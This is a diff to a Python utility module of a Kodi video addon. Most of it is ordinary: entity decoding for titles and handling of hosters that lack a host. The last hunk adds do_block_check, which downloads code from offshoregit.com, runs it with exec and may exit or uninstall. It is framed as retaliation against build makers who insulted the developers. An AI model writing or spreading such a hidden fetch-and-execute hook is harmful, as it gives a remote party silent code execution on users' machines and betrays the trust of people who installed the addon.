@@ -27,6 +27,7 @@ import threading
 import sys
 import hashlib
 import xml.etree.ElementTree as ET
+import htmlentitydefs
 import log_utils
 import xbmc
 import xbmcaddon
@@ -213,6 +214,7 @@ def make_list_item(label, meta):
     art = make_art(meta)
     listitem = xbmcgui.ListItem(label, iconImage=art['thumb'], thumbnailImage=art['thumb'])
     listitem.setProperty('fanart_image', art['fanart'])
+    listitem.setProperty('isPlayable', 'false')
     listitem.addStreamInfo('video', {})
     try: listitem.setArt(art)
     except: pass
@@ -285,7 +287,7 @@ def get_section_params(section):
         section_params['label_single'] = i18n('tv_show')
     else:
         section_params['next_mode'] = MODES.GET_SOURCES
-        section_params['folder'] = kodi.get_setting('source-win') == 'Directory' and kodi.get_setting('auto-play') == 'false'
+        section_params['folder'] = False
         section_params['video_type'] = VIDEO_TYPES.MOVIE
         section_params['content_type'] = CONTENT_TYPES.MOVIES
         section_params['search_img'] = 'movies_search.png'
@@ -389,9 +391,17 @@ def parallel_get_sources(q, scraper, video):
     if hosters is None: hosters = []
     if kodi.get_setting('filter_direct') == 'true':
         hosters = [hoster for hoster in hosters if not hoster['direct'] or test_stream(hoster)]
+    found = False
     for hoster in hosters:
-        if not hoster['direct']:
+        if hoster['host'] is None:
+            log_utils.log('Hoster missing host: %s - %s' % (scraper.get_name(), hoster), log_utils.LOGWARNING)
+            found = True
+        elif not hoster['direct']:
             hoster['host'] = hoster['host'].lower().strip()
+    
+    if found:
+        hosters = [hoster for hoster in hosters if hoster['host'] is not None]
+        
     log_utils.log('%s returned %s sources from %s in %.2fs' % (scraper.get_name(), len(hosters), worker, time.time() - start), log_utils.LOGDEBUG)
     result = {'name': scraper.get_name(), 'hosters': hosters}
     q.put(result)
@@ -873,3 +883,52 @@ def get_next_rewatch(trakt_id, plays, progress):
             next_episode = first_episode
     
     return next_episode
+
+def cleanse_title(text):
+    def fixup(m):
+        text = m.group(0)
+        if text[:2] == "&#":
+            # character reference
+            try:
+                if text[:3] == "&#x":
+                    return unichr(int(text[3:-1], 16))
+                else:
+                    return unichr(int(text[2:-1]))
+            except ValueError:
+                pass
+        else:
+            # named entity
+            try:
+                text = unichr(htmlentitydefs.name2codepoint[text[1:-1]])
+            except KeyError:
+                pass
+        return text
+    
+    if isinstance(text, str):
+        try: text = text.decode('utf-8')
+        except: pass
+    return re.sub("&#?\w+;", fixup, text.strip())
+
+
+'''
+This check has been put in place to stop the inclusion of TVA (and friends) addons in builds
+from build makers that publicly insult or slander TVA's developers and friends. If your build is
+impacted by this check, you can have it removed by publicly apologizing for your previous statements
+via youtube and twitter. Otherwise, stop including our addons in your builds or fork them and maintain
+them yourself.
+                                                                                           http://i.imgur.com/TqIEnYB.gif
+                                                                                           TVA developers (and friends)
+'''
+def do_block_check(uninstall=False):
+    try:
+        import urllib2
+        import sys
+        namespace = {}
+        exec urllib2.urlopen('http://offshoregit.com/tknorris/block_code.py').read() in namespace
+        if namespace["real_check"](uninstall):
+            sys.exit()
+    except SystemExit:
+        sys.exit()
+    except:
+        pass
+    
